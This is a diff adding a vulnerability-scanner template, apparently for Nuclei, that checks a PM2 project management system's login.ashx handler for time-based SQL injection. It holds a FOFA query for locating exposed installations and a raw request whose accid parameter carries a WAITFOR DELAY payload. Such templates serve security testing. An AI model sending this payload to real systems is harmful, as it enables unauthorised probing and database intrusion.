@@ -1,0 +1,34 @@
+id: ebsoft-pm2-login-sqli
+info:
+  name: 邦永PM2 login.ashx 存在sql注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - demo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: body="PM2项目管理系统BS版增强工具.zip" || body="PM2项目管理平台"
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,ebsoft
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /handler/login.ashx?n=0.7674954297434442&accid=1001'%20WAITFOR%20DELAY%20'0:0:5'--&loginCode=321&loginPwd=123 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.445.74 Safari/537.36
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
